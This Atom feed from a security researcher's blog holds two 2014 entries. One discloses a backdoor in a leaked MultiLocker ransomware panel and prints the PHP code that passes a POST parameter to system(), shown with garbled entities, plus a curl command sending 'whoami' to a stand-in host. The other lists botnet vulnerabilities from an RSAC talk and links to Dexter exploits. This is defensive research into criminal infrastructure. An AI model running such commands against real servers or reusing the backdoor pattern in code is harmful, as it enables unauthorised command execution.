<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: multilocker | bwall - Brian Wallace]]></title>
  <link href="https://bwall.github.io/blog/categories/multilocker/atom.xml" rel="self"/>
  <link href="https://bwall.github.io/"/>
  <updated>2014-03-10T11:06:50-07:00</updated>
  <id>https://bwall.github.io/</id>
  <author>
    <name><![CDATA[Brian Wallace]]></name>
    <email><![CDATA[nightstrike9809@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[MultiLocker Backdoor]]></title>
    <link href="https://bwall.github.io/blog/2014/03/09/multilocker-backdoor/"/>
    <updated>2014-03-09T17:28:07-07:00</updated>
    <id>https://bwall.github.io/blog/2014/03/09/multilocker-backdoor</id>
    <content type="html"><![CDATA[<p>In a recent search through some underground communities, I came across the source code to a version of the MultiLocker panel.  With ransomware, the security industry is always looking for a good way to resolve the issue without the ransom being paid.  This could potentially be done by gathering information from the botnet&rsquo;s panel.</p>

<!-- more -->


<p>While there are likely other vulnerabilities, this one stood out after a quick grep of the code.  In the &lsquo;lending/PL.php&rsquo;, there is some obvious backdoor code.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>MultiLocker Backdoor code </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">c</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="nb">system</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">c</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]);</span>
</span><span class='line'><span class="k">die</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>This can easily be accessed with curl or wget (let&rsquo;s assume <a href="http://c2.panel/">http://c2.panel/</a> is the MultiLocker panel root).
<code>
curl -v -d "c=whoami" http://c2.panel/lending/PL.php
</code></p>

<p>For more information on MultiLocker, you can check out a great blog post on it <a href="http://www.xylibox.com/2012/11/multi-locker.html">here</a>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[RSAC 2014 Botnet Vulnerabilities]]></title>
    <link href="https://bwall.github.io/blog/2014/03/09/rsac-2014-botnet-vulnerabilities/"/>
    <updated>2014-03-09T14:37:11-07:00</updated>
    <id>https://bwall.github.io/blog/2014/03/09/rsac-2014-botnet-vulnerabilities</id>
    <content type="html"><![CDATA[<p>This year at RSAC 2014, Stuart McClure and myself did a talk titled Hacking Exposed: Art of Deterrence.  During this talk, we announced various botnet vulnerabilities which had not been previously disclosed and some that had been.  Here I will document some of them.</p>

<!-- more -->


<h1>Dexter</h1>

<p>Dexter, the POS malware was the botnet in the primary focus of the talk.  There were 2 exploits released prior to RSAC, with slightly different objectives.</p>

<ul>
<li><a href="https://raw.github.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/dexter_casinoloader_exec.rb">Dexter MSF Module</a></li>
<li><a href="https://raw.github.com/bwall/BAMF/master/IntegrationQueue/http/dexter.PoC.py">Dexter BAMF PoC</a></li>
</ul>


<h1>Madness Pro</h1>

<p>Madness Pro is a botnet focused on denial of service attacks.  The exploit for this botnet is not yet public as it is still very effective and there are still major versions of this botnet at large.  This exploit can be released upon request.</p>

<h1>Herpes Net 3.0</h1>

<ul>
<li><a href="/blog/2014/03/09/herpes-net-3-dot-0-sqli/">Herpes Net 3.0 SQLi</a></li>
</ul>


<h1>MultiLocker</h1>

<ul>
<li><a href="/blog/2014/03/09/multilocker-backdoor/">MultiLocker Backdoor</a></li>
</ul>

]]></content>
  </entry>
  
</feed>
